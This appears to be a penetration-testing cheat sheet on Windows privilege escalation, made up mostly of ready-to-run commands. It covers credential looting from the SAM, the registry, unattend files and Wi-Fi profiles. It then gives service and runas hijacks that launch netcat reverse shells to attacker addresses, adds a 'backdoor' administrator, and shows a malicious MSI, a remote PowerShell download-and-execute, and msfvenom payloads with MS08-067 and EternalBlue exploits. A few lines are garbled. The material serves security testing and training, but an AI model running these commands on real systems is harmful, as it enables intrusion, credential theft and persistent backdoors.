# Windows - Privilege Escalation

## Summary

* [Tools](#tools)
* [Windows Version and Configuration](#windows-version-and-configuration)
* [User Enumeration](#user-enumeration)
* [Network Enumeration](#network-enumeration)
* [EoP - Looting for passwords](#eop---looting-for-passwords)
* [EoP - Processes Enumeration and Tasks](#eop---processes-enumeration-and-tasks)
* [EoP - Incorrect permissions in services](#eop---incorrect-permissions-in-services)
* [EoP - Windows Subsystem for Linux (WSL)](#eop---windows-subsystem-for-linux-wsl)
* [EoP - Unquoted Service Paths](#eop---unquoted-service-paths)
* [EoP - Kernel Exploitation](#eop---kernel-exploitation)
* [EoP - AlwaysInstallElevated](#eop---alwaysinstallelevated)
* [EoP - Insecure GUI apps](#eop---insecure-gui-apps)
* [EoP - Runas](#eop---runas)
* [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposures)
  * [Token Impersonation (RottenPotato)](#token-impersonation-rottenpotato)
  * [MS08-067 (NetAPI)](#ms08-067-netapi)
  * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
  * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)

## Tools

- [PowerSploit's PowerUp](https://github.com/PowerShellMafia/PowerSploit)
    ```powershell
    powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
    ```
- [Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock](https://github.com/rasta-mouse/Watson)
- [(Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities](https://github.com/rasta-mouse/Sherlock)
    ```powershell
    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1
    ```
- [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
- [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
    ```powershell
    ./windows-exploit-suggester.py --update
    ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
    ```
- [windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems](https://github.com/pentestmonkey/windows-privesc-check)
- [WindowsExploits - Windows exploits, mostly precompiled. Not being updated.](https://github.com/abatchy17/WindowsExploits)
- [WindowsEnum - A Powershell Privilege Escalation Enumeration Script.](https://github.com/absolomb/WindowsEnum)
- [Seatbelt - A C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.](https://github.com/GhostPack/Seatbelt)
- [Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind](https://github.com/M4ximuss/Powerless)
- [JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)
    ```powershell
    powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
    ```

## Windows Version and Configuration

```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

Extract patchs and updates
```powershell
wmic qfe
```

Architecture

```powershell
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
```

List all env variables

```powershell
set
Get-ChildItem Env: | ft Key,Value
```

List all drives

```powershell
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## User Enumeration

Get current username

```powershell
echo %USERNAME% || whoami
$env:username
```

List user privilege

```powershell
whoami /priv
```

List all users

```powershell
net user
whoami /all
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
```

List logon requirements; useable for bruteforcing

```powershell$env:usernadsc
net accounts
```

Get details about a user (i.e. administrator, admin, current user)

```powershell
net user administrator
net user admin
net user %USERNAME%
```

List all local groups

```powershell
net localgroup
Get-LocalGroup | ft Name
```

Get details about a group (i.e. administrators)

```powershell
net localgroup administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
```

## Network Enumeration

List all network interfaces, IP, and DNS.

```powershell
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

List current routing table

```powershell
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

List the ARP table

```powershell
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```

List all current connections

```powershell
netstat -ano
```

List firewall state and current configuration

```powershell
netsh advfirewall firewall dump

or 

netsh firewall show state
netsh firewall show config
```

List firewall's blocked ports

```powershell
$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
```

Disable firewall

```powershell
netsh firewall set opmode disable
netsh advfirewall set allprofiles state off
```

List all network shares

```powershell
net share
```

SNMP Configuration

```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```

## EoP - Looting for passwords

### SAM and SYSTEM files

```powershell
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

### Search for file contents

```powershell
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

### Search for a file with a certain filename

```powershell
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

### Search the registry for key names and passwords

```powershell
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### Read a value of a certain sub key

```powershell
REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList
```

### Passwords in unattend.xml

Location of the unattend.xml files.

```powershell
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

Example content

```powershell
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

Unattend credentials are stored in base64 and can be decoded manually with base64.

```powershell
$ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="  | base64 -d 
SecretSecurePassword1234*
```

The Metasploit module `post/windows/gather/enum_unattend` looks for these files.

### IIS Web config

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

### Other files

```bat
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b
```

### Wifi passwords

Find AP SSID
```bat
netsh wlan show profile
```

Get Cleartext Pass
```bat
netsh wlan show profile <SSID> key=clear
```

Oneliner method to extract wifi passwords from all the access point.

```batch
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```

### Passwords stored in services

Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using [SessionGopher](https://github.com/Arvanaghi/SessionGopher)


```powershell
https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```


## EoP - Processes Enumeration and Tasks

What processes are running?

```powershell
tasklist /v
net start
sc query
Get-Service
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
```

Which processes are running as "system"

```powershell
tasklist /v /fi "username eq system"
```

Do you have powershell magic?

```powershell
REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
```

List installed programs

```powershell
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

List services

```powershell
net start
wmic service list brief
tasklist /SVC
```

Scheduled tasks

```powershell
schtasks /query /fo LIST 2>nul | findstr TaskName
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

Startup tasks

```powershell
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
```

## EoP - Incorrect permissions in services

> A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system.

Often, services are pointing to writeable locations:
- Orphaned installs, not installed anymore but still exist in startup
- DLL Hijacking
- PATH directories with weak permissions

```powershell
$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

$ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```

Alternatively you can use the Metasploit exploit : `exploit/windows/local/service_permissions`

Note to check file permissions you can use `cacls` and `icacls`
> icacls (Windows Vista +)    
> cacls (Windows XP)

You are looking for `BUILTIN\Users:(F)`(Full access), `BUILTIN\Users:(M)`(Modify access) or  `BUILTIN\Users:(W)`(Write-only access) in the output.

### Example with Windows XP SP1

```powershell
# NOTE: spaces are mandatory for this exploit to work !
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.0.73 4343 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
sc config upnphost depend= ""
net start upnphost
```

If it fails because of a missing dependency, try the following commands.

```powershell
sc config SSDPSRV start=auto
net start SSDPSRV
net stop upnphost
net start upnphost

sc config upnphost depend=""
```

Using [`accesschk`](https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe) from Sysinternals.
```powershell
$ accesschk.exe -uwcqv "Authenticated Users" * /accepteula
RW SSDPSRV
        SERVICE_ALL_ACCESS
RW upnphost
        SERVICE_ALL_ACCESS

$ accesschk.exe -ucqv upnphost
upnphost
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
  RW BUILTIN\Power Users
        SERVICE_ALL_ACCESS

$ sc config <vuln-service> binpath="net user backdoor backdoor123 /add"
$ sc config <vuln-service> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
$ sc stop <vuln-service>
$ sc start <vuln-service>
$ sc config <vuln-service> binpath="net localgroup Administrators backdoor /add"
$ sc stop <vuln-service>
$ sc start <vuln-service>
```

## EoP - Windows Subsystem for Linux (WSL)

Technique borrowed from [Warlockobama's tweet](https://twitter.com/Warlockobama/status/1067890915753132032)

> With root privileges Windows  Subsystem for Linux (WSL)  allows users to create a bind shell on any port (no elevation needed). Don't know the root password? No problem just set the default user to root W/ <distro>.exe --default-user root. Now start your bind shell or reverse.

```powershell
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Binary `bash.exe` can also be found in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Alternatively you can explore the `WSL` filesystem in the folder `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## EoP - Unquoted Service Paths

The Microsoft Windows Unquoted Service Path Enumeration Vulnerability. All Windows services have a Path to its executable. If that path is unquoted and contains whitespace or other separators, then the service will attempt to access a resource in the parent path first.

```powershell
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

Metasploit provides the exploit : `exploit/windows/local/trusted_service_path`

### Example

For `C:\Program Files\something\legit.exe`, Windows will try the following paths first:
- `C:\Program.exe`
- `C:\Program Files.exe`


## EoP - Kernel Exploitation

List of exploits kernel : [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

##### #Security Bulletin&nbsp;&nbsp;&nbsp;#KB &nbsp;&nbsp;&nbsp;&nbsp;#Description&nbsp;&nbsp;&nbsp;&nbsp;#Operating System  
- [MS17-017](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS17-017) 　[KB4013081]　　[GDI Palette Objects Local Privilege Escalation]　　(windows 7/8)
- [CVE-2017-8464](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-8464) 　[LNK Remote Code Execution Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)
- [CVE-2017-0213](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213) 　[Windows COM Elevation of Privilege Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)
- [CVE-2018-0833](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-0833)   [SMBv3 Null Pointer Dereference Denial of Service]    (Windows 8.1/Server 2012 R2)
- [CVE-2018-8120](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8120)   [Win32k Elevation of Privilege Vulnerability]    (Windows 7 SP1/2008 SP2,2008 R2 SP1)
- [MS17-010](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS17-010) 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows 7/2008/2003/XP)
- [MS16-135](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135) 　[KB3199135]　　[Windows Kernel Mode Drivers]　　(2016)
- [MS16-111](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-111) 　[KB3186973]　　[kernel api]　　(Windows 10 10586 (32/64)/8.1)
- [MS16-098](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098) 　[KB3178466]　　[Kernel Driver]　　(Win 8.1)
- [MS16-075](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075) 　[KB3164038]　　[Hot Potato]　　(2003/2008/7/8/2012)
- [MS16-034](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034) 　[KB3143145]　　[Kernel Driver]　　(2008/7/8/10/2012)
- [MS16-032](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032) 　[KB3143141]　　[Secondary Logon Handle]　　(2008/7/8/10/2012)
- [MS16-016](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-016) 　[KB3136041]　　[WebDAV]　　(2008/Vista/7)
- [MS16-014](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-014) 　[K3134228]　　[remote code execution]　　(2008/Vista/7)    
...
- [MS03-026](./MS03-026) 　[KB823980]　　 [Buffer Overrun In RPC Interface]　　(/NT/2000/XP/2003)  

To cross compile a program from Kali, use the following command.

```powershell
Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c
```

## EoP - AlwaysInstallElevated

Check if these registry values are set to "1".

```bat
$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

$ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Then create an MSI package and install it.

```powershell
$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
$ msiexec /quiet /qn /i C:\evil.msi
```

Technique also available in Metasploit : `exploit/windows/local/always_install_elevated`

## EoP - Insecure GUI apps

Application running as SYSTEM allowing an user to spawn a CMD, or browse directories.

Example: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## EoP - Runas

Use the `cmdkey` to list the stored credentials on the machine.

```powershell
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Then you can use `runas` with the `/savecred` options in order to use the saved credentials. 
The following example is calling a remote binary via an SMB share.
```powershell
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Using `runas` with a provided set of credential.

```powershell
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

```powershell
$ secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$ mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$ computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```

## EoP - Common Vulnerabilities and Exposure

### Token Impersonation (RottenPotato)

Binary available at : https://github.com/foxglovesec/RottenPotato
Binary available at : https://github.com/breenmachine/RottenPotatoNG

```c
getuid
getprivs
use incognito
list\_tokens -u
cd c:\temp\
execute -Hc -f ./rot.exe
impersonate\_token "NT AUTHORITY\SYSTEM"
```

```powershell
Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
```

### MS08-067 (NetAPI)

Check the vulnerability with the following nmap script.

```c
nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms08-067 <ip_netblock>
```

Metasploit modules to exploit `MS08-067 NetAPI`.

```powershell
exploit/windows/smb/ms08_067_netapi
```

If you can't use Metasploit and only want a reverse shell.

```powershell
https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows

Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)
python ms08-067.py 10.0.0.1 6 445
```


### MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)

Check if the patch is installed : `wmic qfe list | findstr "3139914"`

```powershell
Powershell:
https://www.exploit-db.com/exploits/39719/
https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1

Binary exe : https://github.com/Meatballs1/ms16-032

Metasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```

### MS17-010 (Eternal Blue)

Check the vulnerability with the following nmap script.

```c
nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 <ip_netblock>
```

Metasploit modules to exploit `EternalRomance/EternalSynergy/EternalChampion`.

```powershell
auxiliary/admin/smb/ms17_010_command          MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
auxiliary/scanner/smb/smb_ms17_010            MS17-010 SMB RCE Detection
exploit/windows/smb/ms17_010_eternalblue      MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
exploit/windows/smb/ms17_010_eternalblue_win8 MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
exploit/windows/smb/ms17_010_psexec           MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

If you can't use Metasploit and only want a reverse shell.

```powershell
git clone https://github.com/helviojunior/MS17-010

# generate a simple reverse shell to use
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe
python2 send_and_execute.py 10.0.0.1 revshell.exe
```


## References

* [Windows Internals Book - 02/07/2017](https://docs.microsoft.com/en-us/sysinternals/learn/windows-internals)
* [icacls - Docs Microsoft](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)
* [Privilege Escalation Windows - Philip Linghammar](https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html)
* [Windows elevation of privileges - Guifre Ruiz](https://guif.re/windowseop)
* [The Open Source Windows Privilege Escalation Cheat Sheet by amAK.xyz and @xxByte](https://addaxsoft.com/wpecs/)
* [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
* [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
* [TOP–10 ways to boost your privileges in Windows systems - hackmag](https://hackmag.com/security/elevating-privileges-to-administrative-and-further/)
* [The SYSTEM Challenge](https://decoder.cloud/2017/02/21/the-system-challenge/)
* [Windows Privilege Escalation Guide - absolomb's security blog](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
* [Chapter 4 - Windows Post-Exploitation - 2 Nov 2017 - dostoevskylabs](https://github.com/dostoevskylabs/dostoevsky-pentest-notes/blob/master/chapter-4.md)
* [Remediation for Microsoft Windows Unquoted Service Path Enumeration Vulnerability - September 18th, 2016 - Robert Russell](https://www.tecklyfe.com/remediation-microsoft-windows-unquoted-service-path-enumeration-vulnerability/)
* [Pentestlab.blog - WPE-01 - Stored Credentials](https://pentestlab.blog/2017/04/19/stored-credentials/)
* [Pentestlab.blog - WPE-02 - Windows Kernel](https://pentestlab.blog/2017/04/24/windows-kernel-exploits/)
* [Pentestlab.blog - WPE-03 - DLL Injection](https://pentestlab.blog/2017/04/04/dll-injection/)
* [Pentestlab.blog - WPE-04 - Weak Service Permissions](https://pentestlab.blog/2017/03/30/weak-service-permissions/)
* [Pentestlab.blog - WPE-05 - DLL Hijacking](https://pentestlab.blog/2017/03/27/dll-hijacking/)
* [Pentestlab.blog - WPE-06 - Hot Potato](https://pentestlab.blog/2017/04/13/hot-potato/)
* [Pentestlab.blog - WPE-07 - Group Policy Preferences](https://pentestlab.blog/2017/03/20/group-policy-preferences/)
* [Pentestlab.blog - WPE-08 - Unquoted Service Path](https://pentestlab.blog/2017/03/09/unquoted-service-path/)
* [Pentestlab.blog - WPE-09 - Always Install Elevated](https://pentestlab.blog/2017/02/28/always-install-elevated/) 
* [Pentestlab.blog - WPE-10 - Token Manipulation](https://pentestlab.blog/2017/04/03/token-manipulation/)
* [Pentestlab.blog - WPE-11 - Secondary Logon Handle](https://pentestlab.blog/2017/04/07/secondary-logon-handle/)
* [Pentestlab.blog - WPE-12 - Insecure Registry Permissions](https://pentestlab.blog/2017/03/31/insecure-registry-permissions/)
* [Pentestlab.blog - WPE-13 - Intel SYSRET](https://pentestlab.blog/2017/06/14/intel-sysret/)
* [Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @_xpn_](https://blog.xpnsec.com/becoming-system/)
